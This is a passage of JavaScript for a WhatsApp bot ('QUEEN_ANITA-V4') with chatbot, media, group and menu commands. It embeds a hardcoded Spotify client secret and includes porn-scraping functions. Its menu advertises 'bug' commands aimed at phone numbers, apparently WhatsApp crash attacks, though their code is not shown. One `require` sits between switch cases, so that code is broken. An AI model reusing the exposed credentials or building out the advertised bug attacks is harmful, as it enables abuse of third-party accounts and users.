"💪", "🦾", "🦿", "🦵", "🦶", "👂", "🦻", "👃", "🧠", "🫀",
"🫁", "🦷", "🦴", "👀", "👁️", "👅", "👄", "👶", "🧒", "👦",
"👧", "🧑", "👱", "👨", "🧔", "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳",
"👨‍🦲", "👩", "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲",
"👱‍♀️", "👱‍♂️", "🧓", "👴", "👵", "🙍", "🙍‍♂️", "🙍‍♀️", "🙎", "🙎‍♂️",
"🙎‍♀️", "🙅", "🙅‍♂️", "🙅‍♀️", "🙆", "🙆‍♂️", "🙆‍♀️", "💁", "💁‍♂️", "💁‍♀️",
"🙋", "🙋‍♂️", "🙋‍♀️", "🧏", "🧏‍♂️", "🧏‍♀️", "🙇", "🙇‍♂️", "🙇‍♀️", "🤦",
"🤦‍♂️", "🤦‍♀️", "🤷", "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓",
"👩‍🎓", "🧑‍🏫", "👨‍🏫", "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾",
"🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼",
"👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤",
"👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀",
"🧑‍🚒", "👨‍🚒", "👩‍🚒", "👮", "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", "💂",
"💂‍♂️", "💂‍♀️", "🥷", "👷", "👷‍♂️", "👷‍♀️", "🤴", "👸", "👳", "👳‍♂️",
"👳‍♀️", "👲", "🧕", "🤵", "🤵‍♂️", "🤵‍♀️", "👰", "👰‍♂️", "👰‍♀️", "🤰",
"🤱", "👩‍🍼", "👨‍🍼", "🧑‍🍼", "👼", "🎅", "🤶", "🧑‍🎄", "🦸", "🦸‍♂️",
"🦸‍♀️", "🦹", "🦹‍♂️", "🦹‍♀️", "🧙", "🧙‍♂️", "🧙‍♀️", "🧚", "🧚‍♂️", "🧚‍♀️",
"🧛", "🧛‍♂️", "🧛‍♀️", "🧜", "🧜‍♂️", "🧜‍♀️", "🧝", "🧝‍♂️", "🧝‍♀️", "🧞",
"🧞‍♂️", "🧞‍♀️", "🧟", "🧟‍♂️", "🧟‍♀️", "💆", "💆‍♂️", "💆‍♀️", "💇", "💇‍♂️",
"💇‍♀️", "🚶", "🚶‍♂️", "🚶‍♀️", "🧍", "🧍‍♂️", "🧍‍♀️", "🧎", "🧎‍♂️", "🧎‍♀️",
"🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", "🏃",
"🏃‍♂️", "🏃‍♀️", "💃", "🕺", "🕴️", "👯", "👯‍♂️", "👯‍♀️", "🧖", "🧖‍♂️",
"🧖‍♀️", "🧗", "🧗‍♂️", "🧗‍♀️", "🤺", "🏇", "⛷️", "🏂", "🏌️", "🏌️‍♂️",
"🏌️‍♀️", "🏄", "🏄‍♂️", "🏄‍♀️", "🚣", "🚣‍♂️", "🚣‍♀️", "🏊", "🏊‍♂️", "🏊‍♀️",
"⛹️", "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", "🚴", "🚴‍♂️", "🚴‍♀️", "🚵",
"🚵‍♂️", "🚵‍♀️", "🤸", "🤸‍♂️", "🤸‍♀️", "🤼", "🤼‍♂️", "🤼‍♀️", "🤽", "🤽‍♂️",
"🤽‍♀️", "🤾", "🤾‍♂️", "🤾‍♀️", "🤹", "🤹‍♂️", "🤹‍♀️", "🧘", "🧘‍♂️", "🧘‍♀️",
"🛀", "🛌", "🧑‍🤝‍🧑", "👭", "👫", "👬", "💏", "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩",
"💑", "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", "👪", "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧",
"👨‍👨‍👦", "👨‍👨‍👧", "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧",
"👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧",
"🗣️", "👤", "👥", "🫂", "👣", "🦰", "🦱", "🦳", "🦲", "🐵"];
    
    // Function to pick a random emoji
    const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];

    // Trigger a random emoji reaction once when a message is received
    await David.sendMessage(m.chat, { react: { text: getRandomEmoji(), key: m.key }});
    
  } catch (err) {
    // In case of any errors, still react with a random emoji
    await David.sendMessage(m.chat, { react: { text: getRandomEmoji(), key: m.key }});
  }
}
} 
            
    if (global.chatbot) {
    if (!isCreator.autodownload && !m.key.fromMe) {
        try {
            const userId = m.sender; // Sender's unique ID
            const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(budy)}&userId=${encodeURIComponent(userId)}`;

            // Fetch response from the API
            const response = await fetch(apiUrl);
            const jsonData = await response.json();

            // Check if the API returned a valid response
            if (jsonData.status && jsonData.BK9) {
                David.sendMessage(m.chat, { text: jsonData.BK9 }, { quoted: m }); // Send the AI's response
            } else {
                David.sendMessage(m.chat, { text: 'Failed to fetch response from GPT-4. Please try again later.' }, { quoted: m });
            }
        } catch (error) {
            console.error('Error fetching GPT-4 response:', error);
            David.sendMessage(m.chat, { text: 'An error occurred while fetching the AI response. Please try again later.' }, { quoted: m });
        }
    }
}





try {
const textLower = m.text.toLowerCase();
if (textLower === 'save' || textLower === 'status' || 
textLower === 'please send me this video' || 
textLower === 'send video' ||
textLower === 'Send me' || 
textLower === 'send pls' ||
 textLower === 'pls send' ||
 textLower === 'please send' || 
textLower === 'save' || textLower === 'send') {
 const quotedMessage = m.msg.contextInfo.quotedMessage;
 if (quotedMessage) {
 if (quotedMessage.imageMessage) {
let imageCaption = quotedMessage.imageMessage.caption;
let imageUrl = await David.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
David.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
reply('*Downloading status...*');
 }
 if (quotedMessage.videoMessage) {
let videoCaption = quotedMessage.videoMessage.caption;
let videoUrl = await David.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
David.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
reply('`*Downloading status...*`');
 }
 }
}
} catch (error) {
console.error("`Error, Please Try Again Later`", error);
}   

async function searchSpotifyTracks(query) {
  const clientId = 'acc6302297e040aeb6e4ac1fbdfd62c3';
  const clientSecret = '0e8439a1280a43aba9a5bc0a16f3f009';
  const auth = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');

  const getToken = async () => {
    const response = await fetch('https://accounts.spotify.com/api/token', {
      method: 'POST',
      timeout: 60000, // 60 seconds
      body: new URLSearchParams({ grant_type: 'client_credentials' }),
      headers: { Authorization: `Basic ${auth}` },
    });
    return (await response.json()).access_token;
  };

  const accessToken = await getToken();
  const offset = 10;
  const searchUrl = `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&offset=${offset}`;
  const response = await fetch(searchUrl, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const data = await response.json();
  return data.tracks.items;
}

function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}

const metaai = {
            key: { 
                 fromMe: false,
                 participant: `13135550002@s.whatsapp.net`, ...(m.chat ? 
            { remoteJid: "6285736178354-1625305606@g.us" } : {}) 
                       },
            message: {
                conversation: `_${global.anitav4} Verified By MetaAI_`
            }
        }
        
        async function sendPoll(jid, text, list) {
David.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function searchVideo(query) {
  const url = `https://www.pornhub.com/video/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const videoList = [];

  $('li[data-video-segment]').each((index, element) => {
    const $element = $(element);
    
    const link = $element.find('.title a').attr('href').trim();
    const title = $element.find('.title a').text().trim();
    const uploader = $element.find('.videoUploaderBlock a').text().trim();
    const views = $element.find('.views').text().trim();
    const duration = $element.find('.duration').text().trim();
    
    const videoData = {
      link: "https://www.pornhub.com" + link,
      title: title,
      uploader: uploader,
      views: views,
      duration: duration
    };
    
    videoList.push(videoData);
  });
  
  return videoList;
}

async function searchGif(query) {
  const url = `http://www.pornhub.com/gifs/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const gifs = $('ul.gifs.gifLink li');

    return gifs.map((i, gif) => {
      const data = $(gif).find('a');

      return {
        title: data.find('span').text(),
        url: 'http://dl.phncdn.com#id#.gif'.replace('#id#', data.attr('href')),
        webm: data.find('video').attr('data-webm'),
      };
    }).get();
}

// FUNCTION DOWNLOAD HENTAI SFM
async function hentaivid() {
return new Promise((resolve, reject) => {
const page = Math.floor(Math.random() * 1153)
axios.get('https://sfmcompile.club/page/'+page)
.then((data) => {
const $ = cheerio.load(data.data)
const hasil2 = []
$('#primary > div > div > ul > li > article').each(function (a, b) {
hasil2.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
})
resolve(hasil2)
})
})
}

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Don't tag him!
He is AFK ${reason ? 'with reason' + reason : 'without reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
Back From Afk ${user.afkReason ? ' During ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function monospace(string) {
return '```' + string + '```'
}

function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

const unoDatabasePath = './david-cyril/uno_games.json';

function readUnoGameData() {
    if (fs.existsSync(unoDatabasePath)) {
        const data = fs.readFileSync(unoDatabasePath);
        return JSON.parse(data);
    }
    return {};
}

function writeUnoGameData(data) {
    fs.writeFileSync(unoDatabasePath, JSON.stringify(data, null, 2));
}

async function sendButton(jid, teks1) {
let msg = generateWAMessageFromContent(jid, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks1
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
									{
										"name": "cta_reminder",
										"buttonParamsJson": `{\"display_text\":\"Pengingat Hari Kiamat\",\"id\":\"message\"}`
									},
																		{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"Group!!\",\"url\":\"https://chat.whatsapp.com/HEHSFt134b29XOnjEIRaXX\",\"merchant_url\":\"https://www.google.com\"}`
									},
																		{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"Saluran!!\",\"url\":\"https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i\",\"merchant_url\":\"https://www.google.com\"}`
									}
],
}),
contextInfo: {
externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/2347043759577/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hello ${pushname}`,
                    body: `𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒 𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 ${ownername}`,
                    sourceUrl: "",
                    thumbnail: fkethmb
}
}})}}
}, {quoted: m})
await David.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
}

switch(command) {
case 'menyueuejejsu': case 'helpggyrarr': case 'allmjsjwjwjwjwjenurr':{
let anu = `𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀`
let messageContent = generateWAMessageFromContent(m.chat, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': anu
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./thumb.png')}, { upload: David.waUploadToServer})), 
                  'title': ``,
                  'gifPlayback': true,
                  'subtitle': global.anitav4,
                  'hasMediaAttachment': false  
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"\",\"url\":\"https://chat.whatsapp.com/HEHSFt134b29XOnjEIRaXX\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0"
            })
          })
        }
      }
    }, {});

    return await David.relayMessage(m.chat, messageContent.message, {})
 }
break

case "uptime": case "runtime": { 
 await David.sendMessage(m?.chat, {react: {text: `✨`,key: m?.key,}})
                 reply (`*𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒 𝐇𝐚𝐬 𝐁𝐞𝐞𝐧 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 𝐅𝐨𝐫 ${runtime(process.uptime())}*`) 
 } 
 break
 
//// New Commands

case 'tempadmin':
    if (!text.includes(' ')) return reply('Use the format: @user time_in_minutes');
    let [userr, time] = text.split(' ');
    if (!userr.startsWith('@')) return reply('Mention a valid user.');
    if (isNaN(time)) return reply('Provide time in minutes.');
    await David.groupParticipantsUpdate(from, [userr + '@s.whatsapp.net'], 'promote');
    reply(`@${userr} is now an admin for ${time} minutes.`);
    setTimeout(async () => {
        await David.groupParticipantsUpdate(from, [userr + '@s.whatsapp.net'], 'demote');
        reply(`@${userr} is no longer an admin.`);
    }, time * 60 * 1000);
    break;
    
 case 'activity':
    if (!m.isGroup) return reply('This command can only be used in groups.');
    if (!isBotAdmins) return reply('Bot must be an admin to use this command.');

    let activeMembers = [];
    let nonActiveMembers = [];

    for (let participant of participants) {
        let contact = participant.id;
        let lastSeen;
        try {
            lastSeen = await David.fetchStatus(contact); // Check last seen
        } catch (e) {
            lastSeen = null; // If last seen is unavailable, assume inactive
        }

        if (lastSeen && Date.now() - lastSeen.timestamp < 24 * 60 * 60 * 1000) {
            activeMembers.push(contact);
        } else {
            nonActiveMembers.push(contact);
        }
    }

    let activeList = activeMembers.map(member => `@${member.split('@')[0]}`).join('\n') || 'No active members in the last 24 hours.';
    let nonActiveList = nonActiveMembers.map(member => `@${member.split('@')[0]}`).join('\n') || 'All members are active in the last 24 hours.';

    reply(`*Active Members in the last 24 hours:*\n${activeList}\n\n*Non-Active Members:*\n${nonActiveList}`);
    David.sendMessage(from, { mentions: [...activeMembers, ...nonActiveMembers] });
    break;
    
        
   case 'poll':
    if (!text.includes('|')) return reply('Use the format: question|option1|option2|...');
    const [question, ...options] = text.split('|');
    if (options.length < 2) return reply('Provide at least two options.');
    David.relayMessage(from, {
        pollCreationMessage: {
            name: question,
            options: options.map(o => ({ optionName: o })),
            selectableOptionsCount: options.length
        }
    });
    break;
    
 case 'color':
    if (!text.startsWith('#') || text.length !== 7) return reply('Please provide a valid hex color code (e.g., #3498db).');
    David.sendMessage(from, { image: Buffer.from(`<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"><rect width="200" height="200" fill="${text}"/></svg>`), caption: `Color preview for ${text}` });
    break;
    
                                 
const figlet = require('figlet');

case 'ascii':
    if (!text) return reply('Please provide text to convert.');
    figlet.text(text, (err, result) => {
        if (err) return reply('Error generating ASCII art.');
        reply('```\n' + result + '\n```');
    });
    break;
                                                                

case 'define':
    if (!text) return reply('Please provide a word to define.');
    try {
        const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`);
        const meaning = res.data[0]?.meanings[0]?.definitions[0]?.definition || 'No definition found.';
        reply(`Word: ${text}\nDefinition: ${meaning}`);
    } catch {
        reply('Failed to fetch definition.');
    }
    break;
                                   
   
case 'qrcode':
    if (!text) return reply('Please provide text or a URL to generate a QR code.');
    qrcode.toBuffer(text, { type: 'image/png' }, (err, buffer) => {
        if (err) return reply('Error generating QR code.');
        David.sendMessage(from, { image: buffer, caption: 'Here is your QR code.' });
    });
    break;
        
 case 'binary':
    if (!args[0]) return reply('Please specify encode or decode followed by the text.');
    if (args[0].toLowerCase() === 'encode') {
        reply(text.split('').map(c => c.charCodeAt(0).toString(2)).join(' '));
    } else if (args[0].toLowerCase() === 'decode') {
        reply(text.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join(''));
    } else {
        reply('Invalid option. Use encode or decode.');
    }
    break;
    



case 'tovideo':
    if (!quoted) return reply('Please reply to a video sticker.');
    const mimeType = (quoted.msg || quoted).mimetype || '';
    if (!/webp/.test(mimeType)) return reply('Only video stickers are supported.');

    try {
        // Download the sticker
        let media = await quoted.download();
        let tempWebp = path.join(__dirname, `temp_${Date.now()}.webp`);
        let tempMp4 = path.join(__dirname, `temp_${Date.now()}.mp4`);
        fs.writeFileSync(tempWebp, media);

        // Convert WebP to MP4
        exec(`ffmpeg -i ${tempWebp} -movflags +faststart -pix_fmt yuv420p -vf scale=720:720 ${tempMp4}`, async (err) => {
            if (err) {
                console.error(err);
                reply('Failed to convert the sticker to a video.');
                fs.unlinkSync(tempWebp);
                return;
            }

            // Send the converted video
            await David.sendMessage(from, { video: { url: tempMp4 }, caption: 'Here is your video.' });
            fs.unlinkSync(tempWebp); // Clean up the WebP file
            fs.unlinkSync(tempMp4); // Clean up the MP4 file
        });
    } catch (e) {
        console.error(e);
        reply('An error occurred while processing the sticker.');
    }
    break;

   
////////////###############         
    
 
 case "ping": case "speed": { 
let timestamp = speed()
let latensi = speed() - timestamp
await David.sendMessage(m?.chat, {react: {text: `⚡`,key: m?.key,}}) 
         reply (`*𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒 𝐒𝐏𝐄𝐄𝐃 = > : ${latensi.toFixed(4)}𝐦𝐬*`); 
         } 
 break
 
 
   case 'menu': case "allmenu": case "menulist":
       // React with a lock emoji
    await David.sendMessage(m?.chat, { react: { text: `🫅`, key: m?.key } });
        let ain = "`"
        
        reply(`
┌ ❏ 𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒 ❏ 
│
├❍ prefix : ${global.prefix}
├❍ ᴏᴡɴᴇʀ : ${global.ownername}
├❍ ᴠᴇʀsɪᴏɴ: 4.0
│
└ ❏
${readmore}
┌ ❏ 〤 *AI MENU* 〤
├❍ ${prefix} ᴄʜᴀᴛɢᴘᴛ <query>
├❍ ${prefix} ᴅᴇɢʀᴇᴇɢᴜʀᴜ <query>
├❍ ${prefix} ɢᴇᴍɪɴɪ <query>
├❍ ${prefix} ɢᴇᴍɪɴɪ2 <query> 
├❍ ${prefix} sᴏɴɢᴀɪ <query>
├❍ ${prefix} ᴛᴏᴍᴏᴇ <query>
├❍ ${prefix} ᴘʀᴏᴅɪᴀ <query>
├❍ ${prefix} ᴋᴜʀᴜᴍɪ <query>
├❍ ${prefix} ᴇᴅɪᴛᴇᴇ <query>
├❍ ${prefix} ᴛᴇxᴛ2sᴘᴇᴇᴄʜ <ǫᴜᴇʀʏ>
├❍ ${prefix} ɢᴘᴛ4 <ǫᴜᴇʀʏ>
├❍ ${prefix} ʀᴀɢʙᴏᴛ <ǫᴜᴇʀʏ>
├❍ ${prefix} sᴍᴀʀᴛ  <ǫᴜᴇʀʏ>
├❍ ${prefix} ᴀɪ-sᴇᴀʀᴄʜ <ǫᴜᴇʀʏ>
├❍ ${prefix} ᴛxᴛɪᴍɢ <ǫᴜᴇʀʏ>
├❍ ${prefix} ᴛxᴛ2ɪᴍɢ <ǫᴜᴇʀʏ>
├❍ ${prefix} ᴘʀᴏᴍᴘᴛ-ɢᴘᴛ <ǫᴜᴇʀʏ>
├❍ ${prefix} ɢᴘᴛɢᴏ <ǫᴜᴇʀʏ>
├❍ ${prefix} ꜱɪᴍɪ <on/off>
├❍ ${prefix} ᴅᴀʟʟᴇ <ǫᴜᴇʀʏ>
├❍ ${prefix} ʀᴇᴍɪɴɪ <ɪᴍᴀɢᴇ>
├❍ ${prefix} ʙɪɴɢ <ǫᴜᴇʀʏ>
├❍ ${prefix} ʙʟᴀᴄᴋʙᴏx <ǫᴜᴇʀʏ>
├❍ ${prefix} ɴᴇᴠᴏ  <ᴏ̨ᴜᴇʀʏ>
├❍ ${prefix} ʟᴜᴍɪɴɪ1 <ǫᴜᴇʀʏ>
├❍ ${prefix} ɢᴘᴛ4 <ǫᴜᴇʀʏ>
├❍ ${prefix} ᴅɪғғᴜsɪᴏɴ  <ǫᴜᴇʀʏ>
│
└ ❏

┌ ❏ 〤 *DOWNLOADER MENU* 〤
│
├❍ ${prefix} ᴘʟᴀʏ
├❍ ${prefix} ᴠɪᴅᴇᴏ
├❍ ${prefix} ᴛɪᴋᴛᴏᴋ
├❍ ${prefix} ᴛᴛ2
├❍ ${prefix} ᴛᴛ3
├❍ ${prefix} ᴛᴛsʟɪᴅᴇ
├❍ ${prefix} ɪɢᴍᴘ4
├❍ ${prefix} ɪɢᴅʟ
├❍ ${prefix} ɢᴅʀɪᴠᴇ
├❍ ${prefix} sғɪʟᴇ
├❍ ${prefix} ᴀɪᴏ
├❍ ${prefix} ɢᴏʀᴇᴅʟ
├❍ ${prefix} sᴏɴɢ
├❍ ${prefix} ᴘʟᴀʏ2
├❍ ${prefix} ᴛᴡɪᴛᴛᴇʀ
├❍ ${prefix} ʏᴛᴍᴘ3
├❍ ${prefix} ɢɪᴛᴄʟᴏɴᴇ
├❍ ${prefix} ɪɴsᴛᴀɢʀᴀᴍ
├❍ ${prefix} ᴀᴘᴋ
├❍ ${prefix} ᴍᴇᴅɪᴀғɪʀᴇ
├❍ ${prefix} ʏᴛs
├❍ ${prefix} ғᴀᴄᴇʙᴏᴏᴋ 
├❍ ${prefix} ᴛᴇʀᴀʙᴏx
├❍ ${prefix} ʟʏʀɪᴄs 
│
└ ❏

┌ ❏ 〤 *BUG MENU* 〤
├❍ ${prefix} ʙᴇɴᴋᴀɪ 23490xxxxxx
├❍ ${prefix} ǫ-ᴀɴɪᴛᴀ 23490xxxxxx
├❍ ${prefix} ᴠᴇɴᴏᴍ 23490xxxxxx
├❍ ${prefix} ᴢᴇɴɪᴛsᴜ 23490xxxxxx
└ ❏

┌ ❏ 〤 *ECONOMY MENU* 〤
├❍ ${prefix} ᴅᴀɪʟʏ
├❍ ${prefix} ᴛʀᴀɴsғᴇʀ <ᴛᴀɢ>  < amount >
├❍ ${prefix} ʙᴀɴᴋ
├❍ ${prefix} ᴡᴀʟʟᴇᴛ
├❍ ${prefix} ᴡɪᴛʜᴅʀᴀᴡ
├❍ ${prefix} ᴅᴇᴘᴏsɪᴛ
├❍ ${prefix} sʜᴏᴘ
├❍ ${prefix} ʙᴜʏɢᴜᴀʀᴅ
├❍ ${prefix} ʙᴜʏ
├❍ ${prefix} ʟᴏᴛᴛᴇʀʏ
├❍ ${prefix} ʙᴜʏᴛɪᴄᴋᴇᴛ
├❍ ${prefix} ʀᴏʟʟ-ᴅɪᴄᴇ
├❍ ${prefix} ᴅᴜᴇʟ
└ ❏

┌ ❏ 〤 *WEAPONS MENU* 〤
├❍ ${prefix} ʙᴜʏᴡᴇᴀᴘᴏɴ
├❍ ${prefix} ᴍʏᴡᴇᴀᴘᴏɴs
├❍ ${prefix} ᴀᴛᴛᴀᴄᴋ 
└ ❏

┌ ❏ 〤 *PET MENU* 〤
├❍ ${prefix} ʙᴜʏᴘᴇᴛ <number>
├❍ ${prefix} ᴍʏᴘᴇᴛ
├❍ ${prefix} ᴛʀᴀɪɴ <ɴᴜᴍʙᴇʀ>
├❍ ${prefix} ʙᴀᴛᴛʟᴇ @user
└ ❏


┌ ❏ 〤 *LEVEL-UP MENU* 〤
├❍ ${prefix} ʟᴇᴠᴇʟ
├❍ ${prefix} ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ
└ ❏


┌ ❏ 〤 *EDITOR MENU* 〤
│
├❍ ${prefix} ᴡᴀɴᴛᴇᴅ
├❍ ${prefix} ᴅʀᴀᴋᴇ
├❍ ${prefix} ᴄʟᴏᴡɴ
├❍ ${prefix} ᴀʟᴇʀᴛ
├❍ ${prefix} ᴘᴇᴛɢɪғ
├❍ ${prefix} ᴛᴡᴇᴇᴛ 
├❍ ${prefix} ᴀʟʙᴜᴍ
└ ❏

┌ ❏ 〤 *CRYPTO MENU* 〤
│
├❍ ${prefix} ᴄʀʏᴘᴛᴏ-ᴘʀɪᴄᴇ
├❍ ${prefix} ᴛᴏᴘ-ᴄʀʏᴘᴛᴏ
├❍ ${prefix} ᴄʀʏᴘᴛᴏ-ɪɴᴅᴇx
├❍ ${prefix} ᴄʀʏᴘᴛᴏ-ᴄᴏɴᴠᴇʀᴛ
├❍ ${prefix} ᴄʀʏᴘᴛᴏ-ɴᴇᴡs
├❍ ${prefix} 
├❍ ${prefix} 


┌ ❏ 〤 *TOOLS MENU* 〤
│
├❍ ${prefix} ᴛᴛs
├❍ ${prefix} ᴘʟᴀʏ
├❍ ${prefix} ᴘɪɴ
├❍ ${prefix} ɢᴏᴏɢʟᴇɪᴍᴀɢᴇ
├❍ ${prefix} ᴘʜᴏᴛᴏʟᴇᴀᴘ
├❍ ${prefix} ᴘɪᴄsᴜᴍ
├❍ ${prefix} ɴᴘᴍs
├❍ ${prefix} ᴘʟᴀʏsᴛᴏʀᴇ
├❍ ${prefix} ᴘɪxɪᴠ
├❍ ${prefix} ᴛᴏɪᴍɢ <sᴛɪᴄᴋᴇʀ>
├❍ ${prefix} ᴘɪxᴇʟᴅʀᴀɪɴ
├❍ ${prefix} sᴘᴏᴛɪғʏsᴇᴀʀᴄʜ 
├❍ ${prefix} ᴛᴛᴘ
├❍ ${prefix} ʀᴠᴏ
├❍ ${prefix} ɴɢʟ 
├❍ ${prefix} ᴛᴇᴄʜɴᴇᴡs
├❍ ${prefix} sᴛᴇᴀᴍsᴇᴀʀᴄʜ
├❍ ${prefix} ᴄʜᴏʀᴅ
├❍ ${prefix} ᴛᴛsᴇᴀʀᴄʜ
├❍ ${prefix} ᴛʀ
├❍ ${prefix} ғɪʟᴍsᴇᴀʀᴄʜ
├❍ ${prefix} ɢʀᴏᴜᴘsᴇᴀʀᴄʜ
├❍ ${prefix} ᴛʀᴀᴄᴋɪᴘ
├❍ ${prefix} ɢᴇᴛ
├❍ ${prefix} ғᴅʀᴏɪᴅ
├❍ ${prefix} sᴛʏʟᴇᴛᴇxᴛ
├❍ ${prefix} ᴄɪɴᴇᴍᴀ
├❍ ${prefix} ǫᴜᴏᴛᴇss
├❍ ${prefix} ǫᴜᴏᴛᴇᴅ
├❍ ${prefix} ᴡᴀᴛᴛᴘᴀᴅ
├❍ ${prefix} vv
├❍ ${prefix} ᴛʀᴀɴsʟᴀᴛᴇ
├❍ ${prefix} ʀᴇᴀᴅᴍᴏʀᴇ
├❍ ${prefix} ᴘɪɴᴄʜᴀᴛ
├❍ ${prefix} ǫᴜʀᴀɴ
├❍ ${prefix} ʙɪʙʟᴇ
├❍ ${prefix} ᴇᴍᴏᴊɪᴍɪx
